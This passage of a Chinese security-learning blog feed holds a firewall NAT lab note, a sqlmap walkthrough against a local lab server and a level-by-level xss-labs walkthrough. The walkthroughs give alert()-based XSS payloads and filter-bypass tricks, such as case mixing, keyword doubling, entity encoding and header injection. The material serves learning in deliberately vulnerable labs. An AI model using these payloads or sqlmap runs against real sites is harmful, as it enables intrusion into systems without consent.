plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[FW1]nat-policy</span><br><span class="line">[FW1-policy-nat]rule name source-nat</span><br><span class="line">[FW1-policy-nat-rule-source-nat]source-zone trust</span><br><span class="line">[FW1-policy-nat-rule-source-nat]destination-zone untrust</span><br><span class="line">[FW1-policy-nat-rule-source-nat]action source-nat address-group pool1</span><br></pre></td></tr></table></figure><p>由于公网上有多个网段，防火墙上需要添加缺省路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[FW1]ip route-static 0.0.0.0 0.0.0.0 192.168.18.2</span><br></pre></td></tr></table></figure><p>3.最后进行成果验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PC&gt;ping 192.168.19.1 -t</span><br><span class="line">[FW1]disp firewall session table</span><br></pre></td></tr></table></figure><p><img src="/2024/05/05/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%9A%E5%8A%A1%E7%AE%A1%E7%90%86%EF%BC%88NAT%EF%BC%89/image-20240505183716045.png" alt="image-20240505183716045"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;防火墙业务管理（NAT）&quot;&gt;&lt;a href=&quot;#防火墙业务管理（NAT）&quot; class=&quot;headerlink&quot; title=&quot;防火墙业务管理（NAT）&quot;&gt;&lt;/a&gt;防火墙业务管理（NAT）&lt;/h1&gt;&lt;h2 id=&quot;实验拓扑图：&quot;&gt;&lt;a href=&quot;#实验拓扑图：&quot;</summary>
      
    
    
    
    <category term="信息安全产品配置与应用" scheme="https://w-sqrt7.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="网基" scheme="https://w-sqrt7.github.io/tags/%E7%BD%91%E5%9F%BA/"/>
    
    <category term="eNSP" scheme="https://w-sqrt7.github.io/tags/eNSP/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://w-sqrt7.github.io/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
    <id>https://w-sqrt7.github.io/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</id>
    <published>2024-05-02T03:04:55.298Z</published>
    <updated>2024-05-01T15:44:55.264Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqlmap基础使用"><a href="#sqlmap基础使用" class="headerlink" title="sqlmap基础使用"></a>sqlmap基础使用</h1><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example1.php?name=root&quot; --output-dir=&quot;E:\Tool\tool\SQLmap\output&quot; --batch --random-agent</span><br></pre></td></tr></table></figure><p><img src="/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501225539554.png" alt="image-20240501225539554"></p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example2.php?name=root&quot; --output-dir=&quot;E:\Tool\tool\SQLmap\output&quot; --batch --random-agent --tamper=space2comment -v</span><br></pre></td></tr></table></figure><p><img src="/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501225606261.png" alt="image-20240501225606261"></p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example3.php?name=root&quot; --output-dir=&quot;E:\Tool\tool\SQLmap\output&quot; --batch --random-agent --tamper=space2comment -v</span><br></pre></td></tr></table></figure><p><img src="/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501225717778.png" alt="image-20240501225717778"></p><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example4.php?id=2&quot; --output-dir=&quot;E:\Tool\tool\SQLmap\output&quot; --batch --random-agent</span><br></pre></td></tr></table></figure><p><img src="/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501225952121.png" alt="image-20240501225952121"></p><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example5.php?id=2&quot; --output-dir=&quot;E:\Tool\tool\SQLmap\output&quot; --batch --random-agent</span><br></pre></td></tr></table></figure><p><img src="/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501230040354.png" alt="image-20240501230040354"></p><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example7.php?id=2%0A&quot; --output-dir=&quot;E:\Tool\tool\SQLmap\output&quot; --random-agent --batch</span><br></pre></td></tr></table></figure><p><img src="/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501234453233.png" alt="image-20240501234453233"></p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example8.php?order=name&quot; --output-dir=&quot;E:\Tool\tool\SQLmap\output&quot; --random-agent --dbms=mysql --batch --level 4 --risk 3</span><br></pre></td></tr></table></figure><p><img src="/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501232909037.png" alt="image-20240501232909037"></p><h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example9.php?order=name&quot; --output-dir=&quot;E:\Tool\tool\SQLmap\output&quot; --random-agent --dbms=mysql --batch --level 5 --risk 3</span><br></pre></td></tr></table></figure><p><img src="/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501233326481.png" alt="image-20240501233326481"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sqlmap基础使用&quot;&gt;&lt;a href=&quot;#sqlmap基础使用&quot; class=&quot;headerlink&quot; title=&quot;sqlmap基础使用&quot;&gt;&lt;/a&gt;sqlmap基础使用&lt;/h1&gt;&lt;h2 id=&quot;第一关&quot;&gt;&lt;a href=&quot;#第一关&quot; class=&quot;header</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XSS-labs通关记录</title>
    <link href="https://w-sqrt7.github.io/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <id>https://w-sqrt7.github.io/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</id>
    <published>2024-05-01T05:32:35.376Z</published>
    <updated>2024-05-01T05:41:34.805Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-labs通关记录"><a href="#xss-labs通关记录" class="headerlink" title="xss-labs通关记录"></a>xss-labs通关记录</h1><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>这一关没有做出任何的过滤，直接传入payload即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:90/xss-labs/level1.php?name=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430201556793.png" alt="image-20240430201556793"></p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>先尝试直接传入payload，观察结果发现并没有成功，查看页面源代码，可以看到特殊符号被转义了，可通过传入value中内容，利用  “&gt;  进行语句闭合，执行payload</p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20201732-1714479821209.png" alt="屏幕截图 2024-04-30 201732"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt; &lt;&quot;</span><br><span class="line">&quot;&gt; &lt;img src=&#x27;777&#x27; onerror=alert()&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430202725281.png" alt="image-20240430202725281"></p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>还是先尝试上一关的手法并观察结果，发现传入的特殊符号同样是被转义，这一次连双引号也一起转义了</p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20203304.png" alt="屏幕截图 2024-04-30 203304"></p><p>查看一下源码，可以发现这一关的关键在于htmlspecialchars函数</p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430203735322.png" alt="image-20240430203735322"></p><p>使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为HTML实体，防止浏览器将其作为HTML元素，但是默认是只编码双引号的，而且单引号无论如何都不转义。</p><p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p><p>预定义的字符是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- &amp; （和号）成为 &amp;amp;</span><br><span class="line">- &quot; （双引号）成为 &amp;quot;</span><br><span class="line">- &#x27; （单引号）成为 &#x27;</span><br><span class="line">- &lt; （小于）成为 &amp;lt;</span><br><span class="line">- &gt; （大于）成为 &amp;gt;</span><br></pre></td></tr></table></figure><p>然后尝试绕过特殊符号就可以通关，这里需要用到onclick或者onfocus事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(7)</span><br><span class="line">&#x27; onfocus=javascript:alert(7) &#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430204417225.png" alt="image-20240430204417225"></p><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>和上一关并没有太大的出入，只是单引号变为了双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(7)</span><br><span class="line">&quot; onfocus=javascript:alert(7) &quot;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430204617420.png" alt="image-20240430204617420"></p><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>先尝试上一关payload，并观察页面源代码，可以看到on被过滤了，实际上还过滤了&lt;script ,并且对大小写进行了限制</p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20205222.png" alt="屏幕截图 2024-04-30 205222"></p><p>利用&lt;a&gt;标签进行绕过&lt;a href&#x3D;”<a href="https://www.baidu.com">百度\">https://www.baidu.com&quot;&gt;百度\</a></p><p>href属性的意思是 当标签&lt;a&gt;被点击的时候，就会触发执行转跳，可以是转跳到一个网站，我们还可以触发执行一段js代码</p><p>注意闭合问题，payload传入后点击’xxx’执行即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=javascript:alert(7)&gt;xxx&lt;/a&gt; &lt;&quot;</span><br><span class="line">&quot;&gt; &lt;iframe src=&quot;javascript:alert(7)&quot;&gt;&lt;/iframe&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430210412092.png" alt="image-20240430210412092"></p><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p>这一关过滤了很多，但是并没有对大小写做出限制，可以尝试大小写绕过</p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430210649780.png" alt="image-20240430210649780"></p><p>尝试大小写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;sCript&gt;alert(7)&lt;/sCript&gt; &lt;&quot;</span><br><span class="line">&quot; Onfocus=javascript:alert(7) &quot;</span><br><span class="line">&quot;&gt; &lt;a hRef=javascript:alert(7)&gt;x&lt;/a&gt; &lt;&quot;</span><br><span class="line">&quot;&gt; &lt;a HrEf=&quot;javascript:alert(7)&quot;&gt;</span><br><span class="line">&quot;&gt; &lt;iframe sRc=&quot;javascript:alert(7)&quot;&gt; &lt;/iframe&gt;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430210843884.png" alt="image-20240430210843884"></p><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p>同样尝试上一关的payload并观察，可以理解他将传入的敏感的关键字给处理掉了</p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20211042.png" alt="屏幕截图 2024-04-30 211042"></p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430211719760.png" alt="image-20240430211719760"></p><p>查看源码，观察过滤的内容，发现还可以利用img标签进行绕过，可以利用双写进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;scscriptript&gt;alert(7)&lt;/sscriptcript&gt; &lt;&quot;</span><br><span class="line">&quot;&gt; &lt;a hrehreff=javasscriptcript:alert(7)&gt;xxx&lt;/a&gt; &lt;&quot;</span><br><span class="line">&quot;&gt; &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+&quot;&gt; &lt;&quot;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430211626186.png" alt="image-20240430211626186"></p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>先尝试输入些东西，进行查看，发现传入的内容写入了两个地方</p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20101245.png" alt="屏幕截图 2024-05-01 101245"></p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501101725242.png" alt="image-20240501101725242"></p><p>过滤的关键字很多，但是我们能利用href的自动Unicode解码，插入一段js伪协议，点击链接执行即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert()</span><br><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501102011700.png" alt="image-20240501102011700"></p><h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p>在上一关的基础山又做出了要求，即传入的内容中必需有  http:&#x2F;&#x2F;  才可以</p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501102344500.png" alt="image-20240501102344500"></p><p>基础方法同时，在后面加上 &#x2F;<em>http:&#x2F;&#x2F;</em>&#x2F;将传入的内容注释掉就能绕过且不影响payload正常执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501102629896.png" alt="image-20240501102629896"></p><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>通过url传入参数，观察页面源代码，可以看到，因为h2标签，传入keyword并没有任何作用，且input标签被隐藏掉了</p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20103204.png" alt="屏幕截图 2024-05-01 103204"></p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501103633467.png" alt="image-20240501103633467"></p><p>找到对应的input标签，修改其type值为text，将输入框显示处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=&quot; onclick=&quot;alert(&#x27;xss&#x27;)&quot; type=&quot;text</span><br><span class="line">?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501104117538.png" alt="image-20240501104117538"></p><h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><p>观察源码，可以看出关键点就在于referer头，以此来进行注入即可</p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20104547.png" alt="屏幕截图 2024-05-01 104547"></p><p>通过BP或者hackbar传入payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20105305.png" alt="屏幕截图 2024-05-01 105305"></p><h2 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h2><p>这次先查看前端页面源代码，不难猜出这一关是UA头注入，和上一关没有太大的区别</p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20110130.png" alt="屏幕截图 2024-05-01 110130"></p><p>同样利用BP或hackbar传入payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20110457.png" alt="屏幕截图 2024-05-01 110457"></p><h2 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h2><p>同样的操作，观察代码，可以猜出来这一次是cookie注入</p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20110648.png" alt="屏幕截图 2024-05-01 110648"></p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501111432088.png" alt="image-20240501111432088"></p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501112536081.png" alt="image-20240501112536081"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501112620737.png" alt="image-20240501112620737"></p><h2 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h2><p>这一关具体是个什么意思没动，但是他这个网站好像是寄掉了，不知道有没有影响</p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501113154561.png" alt="image-20240501113154561"></p><p>看了一下网上的内容，说是这一关比较特殊，payload是一张图片马，考察了CTF中的杂项中隐写Exif隐藏信息</p><h2 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h2><p>发现关键点为ng-include</p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20123236.png" alt="屏幕截图 2024-05-01 123236"></p><p>ng-include指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。</p><p>ng-include属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。</p><p>这里尝试包含第一关的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(7)&gt;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501123627808.png" alt="image-20240501123627808"></p><h2 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h2><p>查看源码，发现过滤了空格</p><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501123925887.png" alt="image-20240501123925887"></p><p>尝试利用%0A绕过空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0Aonload=alert(7)&gt;</span><br><span class="line">?keyword=&lt;img%0dsrc=1%0donerror=alert(7)&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501124129938.png" alt="image-20240501124129938"></p><h2 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h2><p>embed标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是呢相对于他们，embed标签打开不了文件的时候就会没有显示的区域在，他们就能有块错误的区域 </p><p>embed标签，是用来嵌入图片的。可以用onclick或onmouseover绕过。因为这两个变量是互相拼接起来的，所以在输入arg02时在b之后加一个空格，当浏览器解析到b的时候就停止判断，然后将onclick或onmouseover看作另外一个属性。可绕过加载的swf文件</p><p>注意火狐浏览器肯能不兼容，注意更换浏览器尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=aaa onmousemove=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501125037463.png" alt="image-20240501125037463"></p><h2 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h2><p>这一关和上一关基本上是一样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=aaa onmousemove=alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501130406838.png" alt="image-20240501130406838"></p><h2 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h2><p>这里无法继续使用前两关的payload，因为他利用双引号将其闭合掉了，没法绕出去了</p><p>这一关用到的是flash xss</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert()&quot;&gt;here&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h2><p>这一关需要反编译的知识点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg01=id&amp;arg02=\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1)</span><br><span class="line">?arg01=id&amp;arg02=xss\&quot;))&#125;catch(e)&#123;alert(1)&#125;//%26width=123%26height=123</span><br></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://blog.csdn.net/l2872253606/article/details/125638898">https://blog.csdn.net/l2872253606/article/details/125638898</a></p><p><a href="https://www.freebuf.com/articles/web/338123.html">https://www.freebuf.com/articles/web/338123.html</a></p><p><a href="https://blog.csdn.net/u014029795/article/details/103213877">https://blog.csdn.net/u014029795/article/details/103213877</a></p><p><a href="https://blog.csdn.net/weixin_30702413/article/details/99326627">https://blog.csdn.net/weixin_30702413/article/details/99326627</a></p><p><a href="https://blog.csdn.net/u014029795/article/details/103217680">https://blog.csdn.net/u014029795/article/details/103217680</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss-labs通关记录&quot;&gt;&lt;a href=&quot;#xss-labs通关记录&quot; class=&quot;headerlink&quot; title=&quot;xss-labs通关记录&quot;&gt;&lt;/a&gt;xss-labs通关记录&lt;/h1&gt;&lt;h2 id=&quot;第一关&quot;&gt;&lt;a href=&quot;#第一关&quot; class</summary>
      
    
    
    
    <category term="靶场" scheme="https://w-sqrt7.github.io/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="xss-labs" scheme="https://w-sqrt7.github.io/categories/%E9%9D%B6%E5%9C%BA/xss-labs/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="靶场" scheme="https://w-sqrt7.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="xss-labs" scheme="https://w-sqrt7.github.io/tags/xss-labs/"/>
    
  </entry>
  
  <entry>
    <title>Docker使用基础详解</title>
